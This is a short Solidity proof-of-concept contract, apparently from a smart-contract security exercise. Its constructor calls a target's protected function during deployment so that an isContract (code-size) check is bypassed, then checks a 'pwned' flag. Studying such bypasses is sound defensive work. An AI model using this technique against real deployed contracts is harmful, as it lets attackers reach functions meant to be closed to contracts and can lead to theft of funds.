// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Bypasscontrol.sol";

contract MaliciousAttacker {
    Target public target;
    bool public successfulAttack;

    constructor(address _target) {
        target = Target(_target);
        // Call the protected function during the construction phase to bypass `isContract` check
        target.protected();
        successfulAttack = target.pwned();
    }

    function attack() external {
        // The pwned state should now be true if the attack was successful
        require(target.pwned(), "Attack failed");
    }
}